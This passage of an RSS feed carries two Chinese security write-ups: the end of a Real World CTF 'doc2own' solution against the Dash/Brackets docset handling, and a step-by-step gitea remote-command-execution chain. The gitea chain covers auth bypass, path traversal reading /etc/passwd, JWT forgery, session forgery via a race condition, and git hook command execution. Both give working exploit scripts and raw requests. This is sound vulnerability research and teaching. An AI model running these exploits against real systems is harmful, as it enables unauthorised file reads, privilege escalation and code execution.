是一致的，避免选手使用已公开的浏览器漏洞利用代码来获得权限。至于打 ctf 用 Safari 0day？疯了吗。&lt;/p&gt;&lt;hr&gt;&lt;blockquote&gt;&lt;b&gt;doc2own&lt;/b&gt; ( Points: 425, Solved by 4 Teams )&lt;br&gt;I have to fix these issues during the flight. Since that airline does not provide Internet, I have to download some documents for offline use.&lt;br&gt;&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//34.236.229.208%3A8080&quot;&gt;http://34.236.229.208:8080&lt;/a&gt;&lt;br&gt;Hint : It’s a pwnable game. You really need to achieve RCE to get the flag.&lt;/blockquote&gt;&lt;p&gt;题目设定的剧情就是一个像我一样的信息技术底层劳动力，在出差的路上需要修 bug，又没网，只能下一个离线文档备用。而这时候下到了不干净的文档，于是电脑中招了。&lt;/p&gt;&lt;p&gt;217 战队按照预期的解法做了出来。&lt;/p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//blog.l4ys.tw/2018/07/realworld-ctf-2018-doc2own/&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot;&gt;https://blog.l4ys.tw/2018/07/realworld-ctf-2018-doc2own/&lt;/a&gt;&lt;p&gt;在这里附上我自己调试通过的一个解法，生成一个 docset，在 Brackets 运行的情况下打开会弹出一个计算器&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;contents=exploit.docset/Contentsdocs=$contents/Resources/Documents

rm -r $contentsmkdir -p $docs
cat &amp;gt; $docs/index.html &amp;lt;&amp;lt;- &quot;EOF&quot;&amp;lt;script&amp;gt;
async function main() {  const list = await fetch(&#39;http://localhost:9234/json&#39;).then(r =&amp;gt; r.json());  const item =  list.find(item =&amp;gt; item.url.indexOf(&#39;file:///&#39;) === 0);  if (!item) return console.error(&#39;invalid response&#39;);  const url = `ws://127.0.0.1:9234/devtools/page/${item.id}`;  console.log(&#39;url:&#39; + url);  exploit(url);}function exploit(url) {  function calc() {    const fs = window.appshell.fs;    const mkdir = path =&amp;gt; new Promise((resolve, reject) =&amp;gt;
      fs.makedir(path, 0755, err =&amp;gt; err =&amp;gt; err === 0 ? resolve(true) : reject(err)));    const writeFile = (path, content) =&amp;gt; new Promise((resolve, reject) =&amp;gt;
      fs.writeFile(path, content, &#39;utf8&#39;, false, err =&amp;gt; err === 0 ? resolve(true) : reject(err)));    const chmod = (path, mode) =&amp;gt; new Promise((resolve, reject) =&amp;gt;
      fs.chmod(path, mode, err =&amp;gt; err === 0 ? resolve(true) : reject(err)));    const INFO_PLIST = `&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
      &amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
      &amp;lt;plist version=&quot;1.0&quot;&amp;gt;
      &amp;lt;dict&amp;gt;
        &amp;lt;key&amp;gt;CFBundleExecutable&amp;lt;/key&amp;gt;
        &amp;lt;string&amp;gt;hello&amp;lt;/string&amp;gt;
        &amp;lt;key&amp;gt;CFBundleIconFile&amp;lt;/key&amp;gt;
        &amp;lt;string&amp;gt;AppIcon&amp;lt;/string&amp;gt;
      &amp;lt;/dict&amp;gt;
      &amp;lt;/plist&amp;gt;`;    const EXEC = `#!/bin/sh      open -a Calculator`;    const app = &#39;/tmp/test.app/&#39;;    const base = app + &#39;Contents/&#39;    return mkdir(base + &#39;MacOS&#39;)      .then(writeFile(base + &#39;Info.plist&#39;, INFO_PLIST))      .then(writeFile(base + &#39;MacOS/hello&#39;, EXEC))      .then(chmod(base + &#39;MacOS/hello&#39;, 0777))      .then(new Promise((resolve, reject) =&amp;gt; {        brackets.app.showOSFolder(app)      }));  }  const ws = new WebSocket(url);  ws.onopen = async () =&amp;gt; {    let counter = 13371337;    const send = (method, params) =&amp;gt; new Promise((resolve, reject) =&amp;gt; {      const id = counter++;      const recv = ({ data }) =&amp;gt; {        const parsed = JSON.parse(data);        if (parsed.id === id) {          resolve(parsed.result);          ws.removeEventListener(&#39;message&#39;, recv);        } else {          console.log(&#39;message: &#39;, data);        }      };      ws.addEventListener(&#39;message&#39;, recv);      ws.send(JSON.stringify({ id, method, params }));    });    const response = await send(&#39;Runtime.evaluate&#39;, { expression: `(${calc})()` });    console.log(response.result);    ws.close();  }  ws.onerror = () =&amp;gt; console.log(&#39;failed to connect&#39;);}main();&amp;lt;/script&amp;gt;
EOF

cat &amp;gt; $contents/Info.plist &amp;lt;&amp;lt;- &quot;EOF&quot;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
&amp;lt;plist version=&quot;1.0&quot;&amp;gt;
&amp;lt;dict&amp;gt;
  &amp;lt;key&amp;gt;CFBundleIdentifier&amp;lt;/key&amp;gt;
  &amp;lt;string&amp;gt;exploit&amp;lt;/string&amp;gt;
  &amp;lt;key&amp;gt;CFBundleName&amp;lt;/key&amp;gt;
  &amp;lt;string&amp;gt;Exploit&amp;lt;/string&amp;gt;
  &amp;lt;key&amp;gt;DocSetPlatformFamily&amp;lt;/key&amp;gt;
  &amp;lt;string&amp;gt;exploit&amp;lt;/string&amp;gt;
  &amp;lt;key&amp;gt;dashIndexFilePath&amp;lt;/key&amp;gt;
  &amp;lt;string&amp;gt;index.html&amp;lt;/string&amp;gt;
  &amp;lt;key&amp;gt;isDashDocset&amp;lt;/key&amp;gt;
  &amp;lt;true/&amp;gt;
&amp;lt;/dict&amp;gt;
&amp;lt;/plist&amp;gt;
EOF

sqlite3 -batch $contents/Resources/docSet.dsidx &amp;lt;&amp;lt; &quot;EOF&quot;CREATE TABLE searchIndex(id INTEGER PRIMARY KEY, name TEXT, type TEXT, path TEXT);CREATE UNIQUE INDEX anchor ON searchIndex (name, type, path);INSERT OR IGNORE INTO searchIndex(name, type, path) VALUES (&#39;Exploit&#39;, &#39;Class&#39;, &#39;index.html&#39;);EOF

open exploit.docset

tar czf exp.tar.gz exploit.docset&lt;/code&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-9aed9f3c57895c564fc6c61b0437830f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;725&quot; data-rawheight=&quot;364&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9aed9f3c57895c564fc6c61b0437830f&quot; data-watermark-src=&quot;v2-ce59018ec0a4bbcde7976e3433c41c84&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;hr&gt;&lt;p&gt;但是出乎我意料的是，另外三支强队 PPP, CyKOR 和 ESPR 在短短的比赛期间内直接交上了两个不同的 0day 解法。赛后我向厂商整理漏洞报告，又快速浏览了一遍反汇编，又发现了另外的一些疑似远程代码执行问题（我没有做 poc，经过开发者自己确认存在）。&lt;/p&gt;&lt;p&gt;&lt;b&gt;Dash 作者接到报告之后非常迅速地推出了修复补丁，检查了线上的 Dash 文档仓库确保之前没有实质性的攻击，在更新日志中明确写明了安全漏洞的存在并对以上战队表示了致谢。应急响应做得非常不错。&lt;/b&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c1224d9312c077421d4def640a5263d5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1244&quot; data-rawheight=&quot;1188&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-c1224d9312c077421d4def640a5263d5&quot; data-watermark-src=&quot;v2-8696ee455e323a6046252f1330f416cb&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;Dash 用户请尽快升级到 4.4.0 来修复这些问题。&lt;/p&gt;</description>
<author>小蘑菇</author>
<guid isPermaLink="false">2018-08-08-41544965</guid>
<pubDate>Wed, 08 Aug 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>Go代码审计 - gitea 远程命令执行漏洞链</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-07-16-39835913.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/39835913&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-111a2318c077e5d343649b60742fa217_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.zhihu.com/people/6f8ffd80705c262c2ee3fa4d9b3f8f06&quot;&gt;@周佩雨&lt;/a&gt;&lt;/p&gt;&lt;p&gt;[ Phith0n，现就职于长亭科技，长期关注并笔耕于安全编码、代码审计等方向]&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这是一个非常漂亮的漏洞链，很久没见过了。&lt;br&gt;我用docker来复现并学习这个漏洞，官方提供了docker镜像，vulhub也会上线这个环境。&lt;/p&gt;&lt;h2&gt;&lt;br&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#_1&quot;&gt;漏洞一、 逻辑错误导致权限绕过&lt;/a&gt;&lt;/h2&gt;&lt;blockquote&gt;这是本漏洞链的导火索，其出现在Git LFS的处理逻辑中。&lt;br&gt;Git LFS是Git为大文件设置的存储容器，我们可以理解为，他将真正的文件存储在git仓库外，而git仓库中只存储了这个文件的索引（一个哈希值）。这样，git objects和.git文件夹下其实是没有这个文件的，这个文件储存在git服务器上。gitea作为一个git服务器，也提供了LFS功能。&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;在 modules/lfs/server.go 文件中，PostHandler是POST请求的处理函数：&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-d929f2e40baaf6f1cfe1bfd334683da8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;564&quot; data-rawheight=&quot;500&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-d929f2e40baaf6f1cfe1bfd334683da8&quot; data-watermark-src=&quot;v2-30163bf9e945a1bb9751aa52c6556186&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;可见，其中间部分包含对权限的检查：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
if !authenticate(ctx, repository, rv.Authorization, true) {
    requireAuth(ctx)
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;在没有权限的情况下，仅执行了requireAuth函数：这个函数做了两件事，一是写入WWW-Authenticate头，二是设置状态码为401。也就是说，在没有权限的情况下，并没有停止执行PostHandler函数。&lt;br&gt;所以，这里存在一处权限绕过漏洞。&lt;/p&gt;&lt;h2&gt;&lt;br&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#_2&quot;&gt;漏洞二、目录穿越漏洞&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;这个权限绕过漏洞导致的后果是，未授权的任意用户都可以为某个项目（后面都以vulhub/repo为例）创建一个Git LFS对象。&lt;/p&gt;&lt;p&gt;这个LFS对象可以通过http://example.com/vulhub/repo.git/info/lfs/objects/[oid]这样的接口来访问，比如下载、写入内容等。其中[oid]是LFS对象的ID，通常来说是一个哈希，但gitea中并没有限制这个ID允许包含的字符，这也是导致第二个漏洞的根本原因。&lt;/p&gt;&lt;p&gt;我们利用第一个漏洞，先发送一个数据包，创建一个Oid为....../../../etc/passwd的LFS对象：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;POST /vulhub/repo.git/info/lfs/objects HTTP/1.1
Host: your-ip:3000Accept-Encoding: gzip, deflate
Accept: application/vnd.git-lfs+json
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; 
Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 151

{ 
    &quot;Oid&quot;: &quot;....../../../etc/passwd&quot;, 
    &quot;Size&quot;: 1000000, 
    &quot;User&quot; : &quot;a&quot;, 
    &quot;Password&quot; : &quot;a&quot;, 
    &quot;Repo&quot; : &quot;a&quot;, 
    &quot;Authorization&quot; : &quot;a&quot;
}&lt;/code&gt;&lt;p&gt;其中，vulhub/repo是一个公开的项目。&lt;/p&gt;&lt;blockquote&gt;也就是说，这个漏洞的利用是有条件的，第一个条件就是需要有一个公开项目。为什么呢？虽然“创建LFS对象”接口有权限绕过漏洞，但是“读取这个对象所代表的文件”接口没有漏洞，会先检查你是否有权限访问这个LFS对象所在的项目。只有公开项目才有权限读取。&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;见下图，发送数据包后，虽然返回了401状态码，但实际上这个LFS对象已经创建成功，且其Oid为....../../../etc/passwd。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6e9540049efacee155988a5491e99364_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;150&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-6e9540049efacee155988a5491e99364&quot; data-watermark-src=&quot;v2-565bff4dd5b1e6d812fa0a1f56416882&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;第二步，就是访问这个对象。访问方法就是GET请求http://example.com/vulhub/repo.git/info/lfs/objects/[oid]/sth，oid就是刚才指定的，这里要用url编码一下。&lt;/p&gt;&lt;p&gt;见下图，/etc/passwd已被成功读取：&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-67ea3af4a552aa4f3206b88d1f1225ee_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;291&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-67ea3af4a552aa4f3206b88d1f1225ee&quot; data-watermark-src=&quot;v2-90dc0125fbfb188264dc7b126b1caf69&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;那么，我们来看看为什么读取到了/etc/passwd文件。&lt;/p&gt;&lt;p&gt;代码 modules/lfs/content_store.go ：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-d8ad85235bfa87345192ce67c32dad27_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;368&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-d8ad85235bfa87345192ce67c32dad27&quot; data-watermark-src=&quot;v2-12d9755017f8fa97cd644ba53e169c65&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;可见，meta.Oid被传入transformKey函数，这个函数里，将Oid转换成了key[0:2]/key[2:4]/key[4:]这样的形式，前两个、中间两个字符做为目录名，第四个字符以后的内容作为文件名。&lt;/p&gt;&lt;p&gt;那么，我创建的Oid为....../../../etc/passwd，在经过transformKey函数后就变成了../../../../../etc/passwd，s.BasePath是LFS对象的基础目录，二者拼接后自然就读取到了/etc/passwd文件。&lt;/p&gt;&lt;p&gt;这就是第二个漏洞：目录穿越。&lt;/p&gt;&lt;h2&gt;&lt;br&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#jwt&quot;&gt;漏洞三、读取配置文件，构造JWT密文&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;vulhub/repo虽然是一个公开项目，但默认只有读权限。我们需要进一步利用。&lt;/p&gt;&lt;p&gt;我们利用目录穿越漏洞，可以读取到gitea的配置文件。这个文件在$GITEA_CUSTOM/conf/app.ini，$GITEA_CUSTOM是gitea的根目录，默认是/var/lib/gitea/，在vulhub里是/data/gitea。&lt;/p&gt;&lt;p&gt;所以，要从LFS的目录跨越到$GITEA_CUSTOM/conf/app.ini，需要构造出的Oid是....gitea/conf/app.ini （经过转换后就变成了/data/gitea/lfs/../../gitea/conf/app.ini，也就是/data/gitea/conf/app.ini。原漏洞作者给出的POC这一块是有坑的，这个Oid需要根据不同$GITEA_CUSTOM的设置进行调整。）&lt;/p&gt;&lt;p&gt;成功读取到配置文件（仍需先发送POST包创建Oid为....gitea/conf/app.ini的LFS对象）：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7b45c16567a56377885231cc84353a7b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;310&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-7b45c16567a56377885231cc84353a7b&quot; data-watermark-src=&quot;v2-47c9e387bc1818ef94ba83b04b5c7a8e&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;配置文件中有很多敏感信息，如数据库账号密码、一些Token等。如果是sqlite数据库，我们甚至能直接下载之。当然，密码加了salt。&lt;/p&gt;&lt;p&gt;Gitea中，LFS的接口是使用JWT认证，其加密密钥就是配置文件中的LFS_JWT_SECRET。所以，这里我们就可以用来构造JWT认证，进而获取LFS完整的读写权限。&lt;/p&gt;&lt;p&gt;我们用python来生成密文：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;import jwt
import time
import base64
 
 
def decode_base64(data):
 missing_padding = len(data) % 4
 if missing_padding != 0:
 
data += &#39;=&#39;* (4 - missing_padding)
 return base64.urlsafe_b64decode(data)
 
 
jwt_secret = decode_base64(&#39;oUsPAAkeic6HaBMHPiTVHxTeCrEDc29sL6f0JuVp73c&#39;)
public_user_id = 1
public_repo_id = 1
nbf = int(time.time())-(60*60*24*1000)
exp = int(time.time())+(60*60*24*1000)
 
token = jwt.encode({&#39;user&#39;: public_user_id, &#39;repo&#39;: public_repo_id, &#39;op&#39;: &#39;upload&#39;, &#39;exp&#39;: exp, &#39;nbf&#39;: nbf}, jwt_secret, algorithm=&#39;HS256&#39;)
token = token.decode()
 
print(token)&lt;/code&gt;&lt;p&gt;其中，jwt_secret是第二个漏洞中读取到的密钥；public_user_id是项目所有者的id，public_repo_id是项目id，这个项目指LFS所在的项目；nbf是指这个密文的开始时间，exp是这个密文的结束时间，只有当前时间处于这两个值中时，这个密文才有效。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-17a35c2d4302d791cab708317b57799a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;29&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;br&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#_3&quot;&gt;漏洞四、利用条件竞争，写入任意文件&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;/h2&gt;&lt;p&gt;现在，我们能构造JWT的密文，即可访问LFS中的写入文件接口，也就是PutHandler。&lt;br&gt;PUT操作主要是如下代码：&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-15b38cbef6917579ef30c29b98abe334_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;504&quot; data-rawheight=&quot;500&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-15b38cbef6917579ef30c29b98abe334&quot; data-watermark-src=&quot;v2-4f9ee61ea61472e828aa6b82a5c88b86&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;整个过程整理如下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;transformKey(meta.Oid) + .tmp 后缀作为临时文件名&lt;/li&gt;&lt;li&gt;如果目录不存在，则创建目录&lt;/li&gt;&lt;li&gt;将用户传入的内容写入临时文件&lt;/li&gt;&lt;li&gt;如果文件大小和meta.Size不一致，则返回错误（meta.size是第一步中创建LFS时传入的Size参数）&lt;/li&gt;&lt;li&gt;如果文件哈希和meta.Oid不一致，则返回错误&lt;/li&gt;&lt;li&gt;将临时文件重命名为真正的文件名&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;因为我们需要写入任意文件，所以Oid一定是能够穿越到其他目录的一个恶意字符串，而一个文件的哈希（sha256）却只是一个HEX字符串。所以上面的第5步，一定会失败导致退出，所以不可能执行到第6步。也就是说，我们只能写入一个后缀是“.tmp”的临时文件。&lt;br&gt;另外，作者用到了defer os.Remove(tmpPath)这个语法。在go语言中，defer代表函数返回时执行的操作，也就是说，不管函数是否返回错误，结束时都会删除临时文件。&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;所以，我们需要解决的是两个问题：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;能够写入一个.tmp为后缀的文件，怎么利用？&lt;/li&gt;&lt;li&gt;如何让这个文件在利用成功之前不被删除？&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;我们先思考第二个问题。漏洞发现者给出的方法是，利用条件竞争。&lt;/p&gt;&lt;p&gt;&lt;br&gt;因为gitea中是用流式方法来读取数据包，并将读取到的内容写入临时文件，那么我们可以用流式HTTP方法，传入我们需要写入的文件内容，然后挂起HTTP连接。这时候，后端会一直等待我传剩下的字符，在这个时间差内，Put函数是等待在io.Copy那个步骤的，当然也就不会删除临时文件了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;那么，思考第一个问题，.tmp为后缀的临时文件，我们能做什么？&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#session&quot;&gt;漏洞五、伪造session提升权限&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;最简单的，我们可以向/etc/cron.d/中写入一个crontab配置文件，然后反弹获取shell。但通常gitea不会运行在root权限，所以我们需要思考其他方法。&lt;br&gt;gitea使用&lt;a href=&quot;https://github.com/go-macaron/session&quot;&gt;go-macaron/session&lt;/a&gt;这个第三方模块来管理session，默认使用文件作为session存储容器。我们来阅读&lt;a href=&quot;https://github.com/go-macaron/session/blob/master/file.go&quot;&gt;go-macaron/session源码&lt;/a&gt;：&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-bf5e7b4dc3cc55db609410b23a438f9c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;613&quot; data-rawheight=&quot;500&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-bf5e7b4dc3cc55db609410b23a438f9c&quot; data-watermark-src=&quot;v2-9eb7a8a6f3ef1b257e2296dd641f1efd&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;这里面有几个很重要的点：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;session文件名为sid[0]/sid[1]/sid&lt;/li&gt;&lt;li&gt;对象被用Gob序列化后存入文件&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;Gob是Go语言独有的序列化方法。我们可以编写一段Go语言程序，来生成一段Gob编码的session：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;package
main
import (
  &quot;fmt&quot;
  &quot;encoding/gob&quot;
  &quot;bytes&quot;
  &quot;encoding/hex&quot;
)
func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
  for _, v := range obj {
  gob.Register(v)
  }
   buf := bytes.NewBuffer(nil)
  err := gob.NewEncoder(buf).Encode(obj)
  return buf.Bytes(), err
}
func main() {
  var uid int64 = 1
  obj := map[interface{}]interface{} {&quot;_old_uid&quot;: &quot;1&quot;, &quot;uid&quot;: uid, &quot;uname&quot;: &quot;vulhub&quot; }
  data, err := EncodeGob(obj)
  if err != nil {
  fmt.Println(err)
  }
  edata := hex.EncodeToString(data)
  fmt.Println(edata)
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;其中，{&quot;_old_iod&quot;:&lt;br&gt;&quot;1&quot;, &quot;uid&quot;: uid, &quot;uname&quot;: &quot;vulhub&quot; }就是session中的数据，uid是管理员id，uname是管理员用户名。编译并执行上述代码，得到一串hex，就是伪造的数据。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;原作者给出的POC是他生成好的一段二进制文件，uid和uname不能自定义。&lt;/blockquote&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-cec39f215655fbd55a1977e1e5f900ff_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;359&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-cec39f215655fbd55a1977e1e5f900ff&quot; data-watermark-src=&quot;v2-9538e95bc0f3bc1e535aa76b1801b955&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;接着，我写了一个简单的Python脚本来进行后续利用（需要Python3.6）：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
import
requests
import jwt
import time
import base64
import logging
import sys
import json
from urllib.parse import quote
 
 
logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)
 
BASE_URL = &#39;http://your-ip:3000/vulhub/repo&#39;
JWT_SECRET = &#39;AzDE6jvaOhh_u30cmkbEqmOdl8h34zOyxfqcieuAu9Y&#39;
USER_ID = 1
REPO_ID = 1
SESSION_ID = &#39;11vulhub&#39;
SESSION_DATA = bytes.fromhex(&#39;0eff81040102ff82000110011000005cff82000306737472696e670c0a00085f6f6c645f75696406737472696e670c0300013106737472696e670c05000375696405696e7436340402000206737472696e670c070005756e616d6506737472696e670c08000676756c687562&#39;)
 
 
def generate_token():
  def decode_base64(data):
  missing_padding = len(data) % 4
  if missing_padding != 0:
  data += &#39;=&#39;* (4 - missing_padding)
  return base64.urlsafe_b64decode(data)
 
  nbf = int(time.time())-(60*60*24*1000)
  exp = int(time.time())+(60*60*24*1000)
 
  token = jwt.encode({&#39;user&#39;: USER_ID, &#39;repo&#39;: REPO_ID, &#39;op&#39;: &#39;upload&#39;, &#39;exp&#39;: exp, &#39;nbf&#39;: nbf}, decode_base64(JWT_SECRET), algorithm=&#39;HS256&#39;)
  return token.decode()
 
def gen_data():
  yield SESSION_DATA
  time.sleep(300)
  yield b&#39;&#39;
 
 
OID = f&#39;....gitea/sessions/{SESSION_ID[0]}/{SESSION_ID[1]}/{SESSION_ID}&#39;
response = requests.post(f&#39;{BASE_URL}.git/info/lfs/objects&#39;, headers={
  &#39;Accept&#39;: &#39;application/vnd.git-lfs+json&#39;
}, json={
  &quot;Oid&quot;: OID,
  &quot;Size&quot;: 100000,
  &quot;User&quot; : &quot;a&quot;,
  &quot;Password&quot; : &quot;a&quot;,
  &quot;Repo&quot; : &quot;a&quot;,
  &quot;Authorization&quot; : &quot;a&quot;
})
logging.info(response.text)
 
response = requests.put(f&quot;{BASE_URL}.git/info/lfs/objects/{quote(OID,
safe=&#39;&#39;)}&quot;, data=gen_data(), headers={
  &#39;Accept&#39;: &#39;application/vnd.git-lfs&#39;,
  &#39;Content-Type&#39;: &#39;application/vnd.git-lfs&#39;,
  &#39;Authorization&#39;: f&#39;Bearer {generate_token()}&#39;
 })
 &lt;/code&gt;&lt;p&gt;&lt;br&gt;这个脚本会将伪造的SESSION数据发送，并等待300秒后才关闭连接。在这300秒中，服务器上将存在一个名为“11vulhub.tmp”的文件，这也是session id。&lt;br&gt;带上这个session id，即可提升为管理员。&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9dda4f4e02021b5675b61871d00e8de4_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;127&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9dda4f4e02021b5675b61871d00e8de4&quot; data-watermark-src=&quot;v2-7136e15e435578da17e4bb6dad48b71e&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;br&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#hook&quot;&gt;漏洞六、利用HOOK执行任意命令&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;带上i_like_gitea=11vulhub.tmp这个Cookie，我们即可访问管理员账户。&lt;/p&gt;&lt;p&gt;然后随便找个项目，在设置中配置Git钩子。Git钩子是执行git命令的时候，会被自动执行的一段脚本。比如我这里用的pre-receive钩子，就是在commit之前会执行的脚本。我在其中加入待执行的命令touch /tmp/success：&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0116e408d9f16943dbcd04281e42802e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;499&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-0116e408d9f16943dbcd04281e42802e&quot; data-watermark-src=&quot;v2-550ed3d2be9de09fb12ef1f8d6b9b64f&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;然后在网页端新建一个文件，点提交。进入docker容器，可见命令被成功执行：&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img 